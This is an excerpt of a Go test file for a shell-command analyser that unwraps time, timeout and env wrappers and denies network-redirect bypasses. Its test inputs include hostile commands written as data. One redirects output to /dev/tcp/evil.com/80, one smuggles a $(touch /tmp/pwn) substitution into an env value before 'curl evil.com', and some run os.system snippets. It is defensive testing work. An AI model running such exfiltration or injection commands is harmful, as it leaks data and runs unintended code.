...
// hasAssign reports whether name is on the EnvVars axis.
...
func TestTimeKeywordNetworkRedirectDenied(t *testing.T) {
	...
	// dropping the redirect is a network-exfil bypass.
	wantDeny(t, `time echo hi > /dev/tcp/evil.com/80`)
}

func TestTimeKeywordRedirectCmdSubExtracted(t *testing.T) {
	// A command substitution in a redirect target on a timed
	// command must still be extracted and checked.
...
func TestTimeoutWrapsInterpreterSnippet(t *testing.T) {
	br, err := wbd(t, `timeout 5 python3 -c 'import os; os.system("id")'`)
	if err != nil {
...
func TestEnvAssignmentValueCmdSubExtracted(t *testing.T) {
	br, err := wbd(t, `env FOO=$(touch /tmp/pwn) curl evil.com`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !hasAssign(br, "FOO") {
...
func TestEnvWrapsInterpreterSnippet(t *testing.T) {
	br, err := wbd(t, `env python3 -c 'import os; os.system("id")'`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !hasSnippet(br, model.LangPython) {
...
func TestEnvPathInvokedStillUnwraps(t *testing.T) {
	// /usr/bin/env python3 (shebang style) is extremely common
	// and must still unwrap, not be denied as a path-invoked
	// wrapper.
...
func TestGnarlyPrivilegeWrappersDenied(t *testing.T) {
	...
	// ambiguous-positional forms that are gnarly to model; fail
	// closed for now (strictly tighter than today's soft-ask).
